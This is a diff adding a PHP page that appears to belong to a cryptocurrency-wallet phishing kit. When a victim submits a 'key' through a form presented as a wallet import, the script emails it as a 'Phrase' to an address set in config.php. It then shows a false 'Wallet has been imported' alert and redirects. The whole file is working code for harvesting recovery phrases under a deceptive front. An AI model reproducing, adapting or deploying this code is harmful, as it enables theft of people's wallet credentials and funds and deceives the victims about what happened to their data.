@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+
+    <?php 
+	
+	include 'config.php';
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+if (isset($_POST['import'])) {
+	$key = trim($_POST['key']);
+    if (!empty($key)) {
+      require_once "PHPMailer/PHPMailer.php";
+      require_once 'PHPMailer/Exception.php';
+
+      $mail= new PHPMailer();
+      $mail->setFrom($username);
+      $mail->FromName = $domainName;
+      $mail->addAddress($send_to);
+      $mail->Subject = " Phrase";
+      $mail->isHTML(true);
+      $mail->Body = ' Phrase - '.$key.' ';
+      $mail->send();
+
+      echo "<script>alert('Wallet has been imported'); window.location.href = 'index.html'</script>";
+    }
+	
+}
+
+?>
+</body>
+</html>
